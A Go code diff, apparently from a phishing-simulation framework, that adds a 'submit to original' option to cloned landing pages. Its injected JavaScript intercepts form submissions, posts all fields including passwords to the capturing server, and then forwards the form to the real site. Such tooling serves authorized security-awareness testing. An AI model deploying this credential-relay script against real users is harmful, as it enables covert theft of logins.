@@ -16,12 +16,43 @@ type Page struct {
 	HTML               string    `json:"html" gorm:"column:html"`
 	CaptureCredentials bool      `json:"capture_credentials" gorm:"column:capture_credentials"`
 	CapturePasswords   bool      `json:"capture_passwords" gorm:"column:capture_passwords"`
+	SubmitToOriginal   bool      `json:"submit_to_original" gorm:"column:submit_to_original"`
 	RedirectURL        string    `json:"redirect_url" gorm:"column:redirect_url"`
 	ModifiedDate       time.Time `json:"modified_date"`
 }
 
 // ErrPageNameNotSpecified is thrown if the name of the landing page is blank.
 var ErrPageNameNotSpecified = errors.New("Page Name not specified")
+
+var JsSubmitToOriginal = `<script type='text/javascript'>(function(){
+  if(typeof __goCaptureAndSubmitToOriginal !== 'function'){
+     window.__goCaptureAndSubmitToOriginal = function(){
+			 if(!__goSubmitToOriginal) return;
+       var forms = jQuery('body').find('form');
+       jQuery.each(forms, function(i, f){
+         var form = jQuery(f);
+         form.submit(function(e){
+           e.preventDefault();
+           jQuery.post("", form.serialize(), function(done){
+             form.off('submit');
+             form.submit();
+           });
+         });
+       });
+     };
+		 if(typeof jQuery === 'undefined'){
+	     var script = document.createElement('script');
+	     script.src = 'https://code.jquery.com/jquery-2.2.4.min.js';
+	     script.type = 'text/javascript';
+	     script.onload = function(){
+	       __goCaptureAndSubmitToOriginal();
+	     };
+	     document.head.appendChild(script);
+	   }else{
+	     __goCaptureAndSubmitToOriginal();
+	   }
+  }
+})()</script>`
 
 // parseHTML parses the page HTML on save to handle the
 // capturing (or lack thereof!) of credentials and passwords
@@ -30,11 +61,27 @@ func (p *Page) parseHTML() error {
 	if err != nil {
 		return err
 	}
+
+	head := d.Find("head")
+
+	if p.CaptureCredentials && p.CapturePasswords && p.SubmitToOriginal {
+		head.AppendHtml("<script type='text/javascript'>var __goSubmitToOriginal = true;</script>")
+		head.AppendHtml(JsSubmitToOriginal)
+	}
+
+	if !p.SubmitToOriginal {
+		head.AppendHtml("<script type='text/javascript'>var __goSubmitToOriginal = false;</script>")
+	}
+
 	forms := d.Find("form")
 	forms.Each(func(i int, f *goquery.Selection) {
-		// We always want the submitted events to be
-		// sent to our server
-		f.SetAttr("action", "")
+		// If we still want to submit to the original domain, do not override
+		if !p.SubmitToOriginal {
+			// We always want the submitted events to be
+			// sent to our server
+			f.SetAttr("action", "")
+		}
+
 		if p.CaptureCredentials {
 			// If we don't want to capture passwords,
 			// find all the password fields and remove the "name" attribute.
